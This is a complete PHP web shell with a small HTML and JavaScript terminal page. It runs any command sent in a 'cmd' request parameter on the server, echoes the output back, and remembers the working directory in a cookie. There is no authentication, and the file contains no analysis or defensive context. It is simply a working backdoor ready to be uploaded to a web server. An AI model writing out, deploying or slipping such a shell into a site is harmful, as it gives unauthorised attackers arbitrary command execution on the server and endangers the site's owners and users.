<?php
function getUser() {
    $user = $_SERVER['USER'];
    if (empty($user)) {
        $processUser = posix_getpwuid(posix_geteuid());
        $user = $processUser['name'];
    }
    return $user;
}
function startsWith($haystack, $needle) {
    return !strncmp($haystack, $needle, strlen($needle));
}
header("content-type: text/plain");
$user = getUser();
$host = $_SERVER["HTTP_HOST"];
$cwd = isset($_COOKIE['cwd']) ? $_COOKIE['cwd'] : getcwd();
if ($cwd && $cwd != getcwd()) {
    if (!chdir($cwd)) {
        echo "failed to change dir to: $cwd";
    }
}
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    if (empty($cmd)) {
        $cwd = getcwd();
        die("[$user@$host $cwd]\$\n");
    }
    if (startsWith($cmd, 'cd')) {
        $args = preg_split("/\s+/", $cmd, 2);
        $new_dir = empty($args[1]) ? $_SERVER['DOCUMENT_ROOT'] : $args[1];
        if (!chdir($new_dir)) {
            die("failed to change dir to: $new_dir");
        }
        $cwd = getcwd();
        setcookie('cwd', $cwd);
        die("[$user@$host $cwd]\$\n");
    }
    $cwd = getcwd();
    echo "[$user@$host $cwd]\$ $cmd\n";
    echo `$cmd 2>&1`;
    die("[$user@$host $cwd]\$\n");
}
header("content-type: text/html");
?>
<!doctype html>
<html>
<head>
<title>shell</title>
<script type="text/javascript">
String.prototype.trim=function() {return this.replace(/(^[\s]*)|([\s]*$)/g,'');}
function onResponse(xhr) {
    if (xhr.readyState == 4) {
        // Response status is OK
        if (xhr.status != 200) {
            alert('Error response status: ' + xhr.status);
            return;
        } else {
            var output = document.getElementById('output');
            output.value = output.value + "\n" + xhr.responseText;
            setTimeout(function() {
                output.scrollTop = output.scrollHeight;
            }, 10);
            //window.scrollTo(0, document.body.scrollHeight);
        }
    }
}
function send(form) {
    var cmd = form.cmd.value;
    if (cmd == 'clear') {
        var output = document.getElementById('output');
        output.value = '';
        form.cmd.value = '';
        cmd = '';
    }
    window.xhr.open('POST', document.URL, true);
    window.xhr.onreadystatechange = function() {onResponse(window.xhr);};
    window.xhr.setRequestHeader("CONTENT-TYPE","application/x-www-form-urlencoded");
    window.xhr.send('cmd=' + encodeURIComponent(cmd) + '&r=' + Math.random());
    //form.cmd.value = '';
    form.cmd.select();
    return false;
}
window.onload = function() {
    if(!window.XMLHttpRequest) {
        window.XMLHttpRequest = function() {return new ActiveXObject('Msxml2.XMLHTTP');};
    }
    window.xhr = new XMLHttpRequest();
    var form = document.getElementById('shellForm');
    form.cmd.focus();
}
</script>
<style>
* {margin:0; padding:0}
* {font-family:'Courier New'; font-size:12px }
#output { background: black; color: #CCC;}
#output { width:100%; height:480px }
#output { border:1px solid black }
</style>
</head>
<body>
<textarea id="output" readonly="readonly" >
<?php
$cwd = getcwd();
echo "[$user@$host $cwd]\$\n";
?>
</textarea>
<form id="shellForm" method="post" onsubmit="return send(this)">
<input type="text" name="cmd" />
<input type="submit" value="Enter" />
</form>
</body>
</html>
